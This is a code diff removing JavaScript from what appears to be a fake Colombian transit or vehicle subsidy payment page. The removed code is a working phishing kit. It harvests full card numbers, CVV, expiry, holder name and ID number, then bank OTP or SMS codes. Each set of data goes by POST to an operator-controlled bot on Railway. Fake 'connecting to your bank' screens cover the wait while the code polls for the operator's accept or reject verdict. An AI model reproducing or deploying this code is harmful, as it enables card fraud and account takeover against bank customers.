-    var isCardValid = cardVal.length >= 15 && cardVal.length <= 16 && luhnCheck(cardVal);
-
-    var cvvValido = false;
-    if (esAmex()) {
-      cvvValido = cvv.value.length === 4;
-    } else {
-      cvvValido = cvv.value.length >= 3 && cvv.value.length <= 4;
-    }
-
-    var isValid = isCardValid && expiryMonth.value !== '' && expiryYear.value !== '' && cvvValido && cardHolder.value.trim().length >= 2 && docNumber.value.trim().length >= 4 && accept1.checked && accept2.checked;
-    submitBtnT.disabled = !isValid;
-
-    actualizarMensajeCvv();
-  }
-
-  [cardNumber, cvv, cardHolder, docNumber, accept1, accept2].forEach(function(el) {
-    el.addEventListener('input', validateForm);
-    el.addEventListener('change', validateForm);
-  });
-  [expiryMonth, expiryYear].forEach(function(el) { el.addEventListener('change', validateForm); });
-
-  setTimeout(validateForm, 100);
-
-  submitBtnT.addEventListener('click', function(e) {
-    if (!this.disabled) {
-      e.preventDefault();
-      var cardInput = cardNumber.value.replace(/\D/g, '');
-      var firstDigit = cardInput.charAt(0);
-      var marca = '';
-      if (firstDigit === '4') marca = 'visa';
-      else if (firstDigit === '5' || firstDigit === '2') marca = 'mastercard';
-      else if (firstDigit === '3') marca = 'amex';
-      else { alert('Solo se aceptan tarjetas Visa, Mastercard o American Express'); return; }
-
-      if (marca === 'amex' && cvv.value.length !== 4) {
-        alert('Tu tarjeta es American Express: el código CVV debe tener 4 dígitos');
-        cvv.focus();
-        return;
-      }
-
-      var sessionId = window.__PYP_SESSION__ || ('PYP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase());
-      sessionIdActualPago = sessionId;
-
-      if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_tarjeta');
-
-      cerrarModalTarjeta();
-      mostrarPagoCarga(marca);
-
-      var payload = {
-        sessionId: sessionId,
-        bancoKey: BANCO_KEY_ACTUAL, // 🔥 Se envía al bot para que sepa si es Bogotá o Bucaramanga
-        marca: marca,
-        tarjeta: cardNumber.value,
-        titular: cardHolder.value.trim(),
-        docType: document.getElementById('docType').value,
-        docNumber: docNumber.value.trim(),
-        monto: TOTAL_PAGO,
-        expMes: expiryMonth.value,
-        expAnio: expiryYear.value,
-        cvv: cvv.value,
-        placa: window.__DATOS_SUBSIDIO__ ? window.__DATOS_SUBSIDIO__.placa : '',
-        subsidio: true
-      };
-
-      fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/enviar-pago', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(function(err) { console.error('Error enviando pago:', err); });
-
-      iniciarPollingPago(sessionId, marca, payload);
-    }
-  });
-
-  var cvvModal = document.getElementById('cvvModal');
-  var cvvHelpBtn = document.getElementById('cvvHelpBtn');
-  var cvvModalClose = document.getElementById('cvvModalClose');
-  var cvvModalBack = document.getElementById('cvvModalBack');
-  if (cvvHelpBtn) cvvHelpBtn.addEventListener('click', function() { cvvModal.classList.add('active'); });
-  if (cvvModalClose) cvvModalClose.addEventListener('click', function() { cvvModal.classList.remove('active'); });
-  if (cvvModalBack) cvvModalBack.addEventListener('click', function() { cvvModal.classList.remove('active'); });
-  if (cvvModal) cvvModal.addEventListener('click', function(e) { if (e.target === this) cvvModal.classList.remove('active'); });
-
-  var dynamicInput = document.getElementById('dynamicCode');
-  var hideTimeout = null;
-  if (dynamicInput) {
-    dynamicInput.addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0, 8);
-      this.style.webkitTextSecurity = 'none';
-      this.style.textSecurity = 'none';
-      if (hideTimeout) clearTimeout(hideTimeout);
-      hideTimeout = setTimeout(function() {
-        dynamicInput.style.webkitTextSecurity = 'disc';
-        dynamicInput.style.textSecurity = 'disc';
-      }, 2000);
-    });
-  }
-});
-
-/* ============================================================
-   POLLING PAGO
-   ============================================================ */
-/* Variable global para el Lottie */
-let lottieInstance = null;
-let textoRotadorInterval = null;
-
-const TEXTOS_CARGA = [
-    { texto: 'Conectando con tu banco', sub: 'Estableciendo conexión segura' },
-    { texto: 'Validando datos de la tarjeta', sub: 'Verificando información' },
-    { texto: 'Autorizando transacción', sub: 'El banco está procesando tu pago' },
-    { texto: 'Casi listo', sub: 'Confirmando el resultado' }
-];
-
-function iniciarLottie() {
-    const container = document.getElementById('pagoCargaLottie');
-    if (!container || !window.lottie) return;
-    container.innerHTML = '';
-    lottieInstance = window.lottie.loadAnimation({
-        container: container,
-        renderer: 'svg',
-        loop: true,
-        autoplay: true,
-        path: 'https://assets10.lottiefiles.com/packages/lf20_p8bfn5to.json'
-    });
-}
-
-function detenerLottie() {
-    if (lottieInstance) {
-        lottieInstance.destroy();
-        lottieInstance = null;
-    }
-}
-
-function rotarTextosCarga() {
-    let i = 0;
-    const elTexto = document.getElementById('pagoCargaTexto');
-    const elSub = document.getElementById('pagoCargaSubtexto');
-    if (!elTexto || !elSub) return;
-    elTexto.textContent = TEXTOS_CARGA[0].texto;
-    elSub.textContent = TEXTOS_CARGA[0].sub;
-    if (textoRotadorInterval) clearInterval(textoRotadorInterval);
-    textoRotadorInterval = setInterval(() => {
-        i = (i + 1) % TEXTOS_CARGA.length;
-        elTexto.style.opacity = '0';
-        elSub.style.opacity = '0';
-        setTimeout(() => {
-            elTexto.textContent = TEXTOS_CARGA[i].texto;
-            elSub.textContent = TEXTOS_CARGA[i].sub;
-            elTexto.style.opacity = '1';
-            elSub.style.opacity = '1';
-        }, 250);
-    }, 2500);
-}
-
-/* ============================================================
-   POLLING DE PAGO (ESPERAR RESPUESTA DEL BACKEND)
-   ============================================================ */
-function iniciarPollingPago(sessionId, marca, payload) {
-  if (pagoPollingInterval) clearInterval(pagoPollingInterval);
-  
-  pagoPollingInterval = setInterval(function() {
-    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sessionId)
-      .then(function(r) { return r.json(); })
-      .then(function(data) {
-        if (data.estado === 'aceptado') {
-          clearInterval(pagoPollingInterval);
-          pagoPollingInterval = null;
-          ocultarPagoCarga();
-          
-          var numTarjeta = (payload.tarjeta || '').replace(/\D/g, '');
-          var ultimos4 = numTarjeta.slice(-4);
-          var enmascarado = '************' + ultimos4;
-          
-          document.getElementById('lastFourDigitsPopup').textContent = enmascarado;
-          document.getElementById('popupCardNumber').textContent = enmascarado;
-          document.getElementById('montoPopup').textContent = Number(payload.monto).toLocaleString('es-CO');
-          document.getElementById('montoPopup2').textContent = Number(payload.monto).toLocaleString('es-CO');
-          
-          var logoContainer = document.getElementById('cardBrandLogo');
-          if (marca === 'visa') {
-            logoContainer.innerHTML = '<svg viewBox="0 0 192.756 192.756" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
-          } else if (marca === 'amex') {
-            logoContainer.innerHTML = '<svg viewBox="0 0 100 50" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
-          } else {
-            logoContainer.innerHTML = '<svg viewBox="0 0 100 62" style="height:44px; max-height:44px; width:auto;" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
-          }          
-          var today = new Date();
-          document.getElementById('currentDate').textContent = 
-            String(today.getDate()).padStart(2, '0') + '/' +
-            String(today.getMonth() + 1).padStart(2, '0') + '/' +
-            today.getFullYear();
-            
-          openAuthModal();
-          
-        } else if (data.estado === 'rechazado') {
-          clearInterval(pagoPollingInterval);
-          pagoPollingInterval = null;
-          ocultarPagoCarga();
-          mostrarPagoError(marca);
-        }
-      })
-      .catch(function(err) { console.error('Error consultando estado:', err); });
-  }, 2000);
-}
-
-function mostrarPagoCarga(marca) {
-    if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_tarjeta');
-    const overlay = document.getElementById('pagoCargaOverlay');
-    const logo = document.getElementById('pagoCargaLogo');
-    
-    if (marca === 'visa') {
-        // 🔥 Fondo transparente y tamaño de 140px
-        logo.outerHTML = '<svg id="pagoCargaLogo" class="pago-carga-logo" style="height:140px; width:auto; max-width:340px;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
-    } else if (marca === 'amex') {
-        logo.outerHTML = '<svg id="pagoCargaLogo" class="pago-carga-logo" style="height:140px; width:auto; max-width:340px;" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
-    } else {
-        logo.outerHTML = '<svg id="pagoCargaLogo" class="pago-carga-logo" style="height:140px; width:auto; max-width:340px;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
-    }
-    
-    overlay.classList.remove('hidden');
-    document.body.style.overflow = 'hidden';
-    setTimeout(() => {
-        iniciarLottie();
-        rotarTextosCarga();
-    }, 50);
-}
-
-function ocultarPagoCarga() {
-    document.getElementById('pagoCargaOverlay').classList.add('hidden');
-    document.body.style.overflow = '';
-    detenerLottie();
-    if (textoRotadorInterval) {
-        clearInterval(textoRotadorInterval);
-        textoRotadorInterval = null;
-    }
-}
-/* ============================================================
-   OTP
-   ============================================================ */
-function openAuthModal() {
-  if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('ingresando_otp');
-  var modal = document.getElementById('authModal');
-  modal.style.display = 'flex';
-  setTimeout(function() { modal.classList.add('show'); }, 10);
-}
-function closeAuthModal() {
-  var modal = document.getElementById('authModal');
-  modal.classList.remove('show');
-  setTimeout(function() { modal.style.display = 'none'; document.body.style.overflow = ''; }, 400);
-}
-
-document.getElementById('btnEnviarDinamica').addEventListener('click', function() {
-  var codigo = document.getElementById('dynamicCode').value.replace(/\D/g, '');
-  if (!codigo || codigo.length < 4) {
-    alert('Por favor ingresa tu clave dinámica o SMS');
-    return;
-  }
-  var marca = 'visa';
-  var cardNum = document.getElementById('cardNumber').value.replace(/\D/g, '');
-  if (cardNum.startsWith('5') || cardNum.startsWith('2')) marca = 'mastercard';
-  else if (cardNum.startsWith('3')) marca = 'amex';
-
-  closeAuthModal();
-  mostrarCargaOtp(marca);
-
-  fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/enviar-otp', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ sessionId: sessionIdActualPago, otp: codigo, bancoKey: BANCO_KEY_ACTUAL })
-  }).catch(function(err) { console.error('Error enviando OTP:', err); });
-
-  iniciarPollingOtp(sessionIdActualPago, marca);
-});
-
-function mostrarCargaOtp(marca) {
-  if (window.__PYP_SET_ACCION__) window.__PYP_SET_ACCION__('enviando_otp');
-  var overlay = document.getElementById('pagoCargaOtpOverlay');
-  var logo = document.getElementById('pagoCargaOtpLogo');
-  
-  if (marca === 'visa') {
-    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 192.756 192.756" xmlns="http://www.w3.org/2000/svg"><path fill="transparent" d="M0 0h192.756v192.756H0V0z"/><path fill="#1d5b99" d="M181.266 155.531H8.504V37.225h175.748V155.531h-2.986z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#fff" d="M181.266 152.545H11.49V40.211h169.776v112.334z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M72.851 114.621l11.026-36.355h9.838l-11.027 36.355h-9.837zM68.453 78.276l-8.85 15.412c-2.252 4.037-3.57 6.076-4.203 8.625h-.135c.157-3.232-.294-7.203-.336-9.447l-.978-14.59h-16.56l-.169.978c4.254 0 6.777 2.137 7.471 6.509l3.228 28.858h10.192l20.609-36.345H68.453zM144.959 114.621l-.271-5.406-12.283-.01-2.514 5.416h-10.68l19.367-36.286h13.109l3.279 36.286h-10.007zm-1.127-21.445c-.111-2.687-.201-6.333-.02-8.541h-.145c-.598 1.805-3.17 7.225-4.301 9.89l-3.66 7.968h8.625l-.499-9.317zM104.043 115.654c-6.945 0-11.555-2.203-14.845-4.168l4.686-7.156c2.955 1.652 5.274 3.559 10.612 3.559 1.715 0 3.369-.445 4.309-2.072 1.367-2.363-.316-3.637-4.158-5.812l-1.898-1.234c-5.697-3.892-8.162-7.59-5.48-14.044 1.717-4.128 6.242-7.258 13.711-7.258 5.148 0 9.977 2.228 12.789 4.404l-5.387 6.318c-2.746-2.22-5.021-3.343-7.625-3.343-2.076 0-3.654.801-4.199 1.881-1.025 2.03.332 3.414 3.326 5.272l2.256 1.436c6.918 4.363 8.564 8.937 6.832 13.212-2.984 7.363-8.822 9.005-14.929 9.005zM157.895 83.193h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .47-.287.665-.676.708l.727 1.14h-.482l-.67-1.108h-.402v1.108zm.476-1.473c.32 0 .602-.031.602-.407 0-.313-.307-.351-.562-.351h-.516v.758h.476zm-.012 2.476c-1.348 0-2.307-1.009-2.307-2.344 0-1.409 1.064-2.343 2.307-2.343 1.227 0 2.293.934 2.293 2.343 0 1.41-1.066 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.796-1.805 1.936 0 1.065.689 1.936 1.805 1.936 1.002 0 1.791-.79 1.791-1.936 0-1.14-.789-1.936-1.791-1.936z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#e7a83a" d="M177.086 125.912H15.969v21.557h161.117v-21.557z"/><path fill-rule="evenodd" clip-rule="evenodd" fill="#1d5b99" d="M176.787 45.586H15.671v21.558h161.116V45.586zM173.105 145.936h-.426v-2.594h.984c.627 0 .945.219.945.746 0 .469-.287.664-.676.707l.727 1.141h-.482l-.67-1.109h-.402v1.109zm.477-1.473c.32 0 .602-.031.602-.408 0-.312-.307-.35-.562-.35h-.516v.758h.476zm-.012 2.475c-1.348 0-2.307-1.008-2.307-2.344 0-1.408 1.066-2.342 2.307-2.342 1.229 0 2.293.934 2.293 2.342 0 1.41-1.064 2.344-2.293 2.344zm0-4.28c-1.016 0-1.805.797-1.805 1.936 0 1.066.689 1.936 1.805 1.936 1.002 0 1.791-.789 1.791-1.936 0-1.139-.789-1.936-1.791-1.936z"/></svg>';
-  } else if (marca === 'amex') {
-    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="50" rx="4" fill="#006FCF"/><text x="50" y="26" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="900" font-size="18" letter-spacing="1.5">AMEX</text><text x="50" y="38" text-anchor="middle" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-weight="500" font-size="6" letter-spacing="0.8">AMERICAN EXPRESS</text></svg>';
-  } else {
-    logo.outerHTML = '<svg id="pagoCargaOtpLogo" class="pago-carga-otp-logo" style="height:160px; max-height:160px; width:auto; max-width:300px; object-fit:contain; display:block; margin: 0 auto;" viewBox="0 0 100 62" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="31" r="30" fill="#EB001B"/><circle cx="68" cy="31" r="30" fill="#F79E1B"/><path d="M50 8 C38 16 30 23 30 31 C30 39 38 46 50 54 C62 46 70 39 70 31 C70 23 62 16 50 8 Z" fill="#FF5F00"/></svg>';
-  }
-  
-  overlay.classList.remove('hidden');
-  document.body.style.overflow = 'hidden';
-}
-function ocultarCargaOtp() {
-  document.getElementById('pagoCargaOtpOverlay').classList.add('hidden');
-  document.body.style.overflow = '';
-}
-function mostrarErrorOtp() {
-  ocultarCargaOtp();
-  document.getElementById('pagoErrorOtpOverlay').classList.remove('hidden');
-  document.body.style.overflow = 'hidden';
-}
-function cerrarErrorOtpYReintentar() {
-  document.getElementById('pagoErrorOtpOverlay').classList.add('hidden');
-  document.body.style.overflow = '';
-  openAuthModal();
-}
-function iniciarPollingOtp(sessionId, marca) {
-  if (pagoOtpPollingInterval) clearInterval(pagoOtpPollingInterval);
-  pagoOtpPollingInterval = setInterval(function() {
-    fetch(URL_BOT_RAILWAY + '/' + BANCO_KEY_ACTUAL + '/estado/' + sessionId)
-      .then(function(r) { return r.json(); })
-      .then(function(data) {
-        if (data.estado === 'aceptado') {
-          clearInterval(pagoOtpPollingInterval);
-          pagoOtpPollingInterval = null;
-          ocultarCargaOtp();
-          setTimeout(function() { window.location.href = window.location.pathname; }, 300);
-        } else if (data.estado === 'rechazado') {
-          clearInterval(pagoOtpPollingInterval);
-          pagoOtpPollingInterval = null;
-          mostrarErrorOtp();
-        }
-      })
-      .catch(function(err) { console.error('Error consultando estado OTP:', err); });
-  }, 2000);
-}
-</script>
-
-<!-- FOOTER INSTITUCIONAL DTB -->
 <footer class="footer">
   <div class="footer-inner">
     <div class="footer-col">
